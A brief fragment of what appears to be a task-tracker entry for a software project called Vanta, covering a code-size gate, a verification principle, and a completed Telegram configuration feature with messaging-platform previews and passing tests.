items.done: A commit or factory cycle with an oversized file/function/complexity is flagged by Vanta's own gate (not just the factory), reporting file:line + limit + fix; passing code commits clean.

items.title: Verification must prove the actual claim (not a proxy)

Configures Telegram for real (writes VANTA_TELEGRAM_TOKEN via the shared upsertEnv, other keys preserved); previews planned iMessage/WhatsApp/Signal with exact setup steps + prerequisites + risk warnings; honest [available/configured/planned] status per platform. 7 tests; full suite 1090 green; tsc clean.
